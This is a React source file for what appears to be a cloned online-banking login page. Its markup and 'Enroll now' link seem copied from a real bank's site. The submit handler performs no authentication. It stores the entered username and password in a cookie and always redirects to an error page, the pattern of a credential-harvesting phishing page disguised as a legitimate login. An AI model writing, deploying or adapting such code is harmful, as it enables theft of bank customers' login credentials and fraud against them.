import React from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";

export default function Login() {

  const [formInput, setFormInput] = React.useState<Login>({
    username: "",
    password: "",
  });

  const navigate = useNavigate();

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    cookies.set("login1", formInput);
    navigate("../login/error", { replace: true });
  }

  return (
    <>

      <form
        className="form--horizontal padding--add"
        data-bind="submit: submit"
        autoComplete="off"
        method="post"
        onSubmit={handleSubmit}
      >
        <div className="form__group">
          <label className="form__label large--one-quarter" htmlFor="username">
            Username
          </label>
          <div className="form__control large--one-quarter medium--one-half">
            <div
              className="hideShowPassword-wrapper"
              style={{
                position: "relative",
                width: "100%",
                display: "inline-block",
                verticalAlign: "baseline",
                margin: "0px",
              }}
            >
              <input
                data-bind="textInput: username, event: {&#39;keydown&#39;: toggleHideShowOnKeyboardShortcut}"
                name="username"
                onChange={handleInputChange}
                id="username"
                type="text"
                autoFocus
                autoComplete="off"
                autoCorrect="off"
                autoCapitalize="off"
                required
                aria-required="true"
                aria-describedby="usernametext usernameToggleText"
                className="hideShowPassword-field"
                style={{ margin: "0px", paddingRight: "35.5804px" }}
              />
              <button
                type="button"
                aria-label="Username visible."
                tabIndex={-1}
                className="hideShowPassword-toggle hideShowPassword-toggle-hide"
                aria-pressed="false"
                title="Hide username"
                style={{
                  position: "absolute",
                  right: "0px",
                  top: "50%",
                  marginTop: "-14.625px",
                }}
              >
                Hide
              </button>
            </div>
          </div>
          <p id="usernameToggleText" className="is--hidden">
            Use ctrl + m to toggle protection
          </p>
          <p
            id="usernametext"
            style={{ display: "none" }}
            className="text--error text--error-form push--large--one-quarter"
            data-bind="visible: usernameError(), text: usernameError()"
          ></p>
        </div>
        <div className="form__group">
          <label className="form__label large--one-quarter" htmlFor="password">
            Password
          </label>
          <div className="form__control large--one-quarter medium--one-half">
            <input
              id="password"
              data-bind="textInput: password"
              name="password"
              type="password"
              required
              aria-required="true"
              data-mask="none"
              autoComplete="off"
              aria-describedby="passwordtext"
              onChange={handleInputChange}
            />
          </div>
        </div>
        <div className="form__group">
          <div className="push--large--one-quarter large--one-quarter medium--one-half">
            <button
              type="submit"
              className="btn btn--primary"
              data-bind="enable: !showProcessingIndicator()"
            >
              
              Log in
            </button>
          </div>
        </div>
        <div className="form__group">
          <div className="push--large--one-quarter large--one-quarter medium--one-half">
            <p className="push--up">
              Not yet enrolled?
              <a href="https://fbibcr.com/PBI_PBI1151/Enroll/101903336">
                Enroll now
              </a>
              .
            </p>
          </div>
        </div>
      </form>
    </>
  );
}
